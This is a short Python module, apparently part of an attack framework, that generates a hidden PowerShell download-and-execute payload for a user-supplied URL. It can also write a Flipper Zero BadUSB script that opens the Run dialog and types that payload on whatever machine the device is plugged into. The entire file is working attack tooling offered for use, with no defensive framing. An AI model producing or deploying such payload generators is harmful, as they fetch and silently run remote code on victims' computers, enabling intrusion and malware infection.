import os

class Exploit:
    name = "Download and Execute + Flipper BadUSB Generator"
    description = "Generates PowerShell payload and optional Flipper Zero BadUSB script"
    options = {}

    def run(self):
        url = input("[?] What website do you want to download from? (include http/https): ").strip()

        if not url.startswith("http"):
            print("[!] Invalid URL. Must start with http:// or https://")
            return

        # PowerShell payload
        payload = f'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"'
        print("\n[+] Generated PowerShell Payload:")
        print("----------------------------------")
        print(payload)
        print("----------------------------------")

        # Ask if Flipper Zero script is wanted
        choice = input("[?] Do you want to generate a Flipper Zero BadUSB.txt? (y/n): ").strip().lower()
        if choice == 'y':
            filename = "flipper_badusb_payload.txt"
            with open(filename, "w") as f:
                f.write(f"""REM Flipper Zero BadUSB Script - Download & Execute
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 500
STRING {payload}
ENTER
""")
            print(f"[+] Flipper BadUSB script saved as: {filename}")
        else:
            print("[*] Skipped Flipper Zero script generation.")
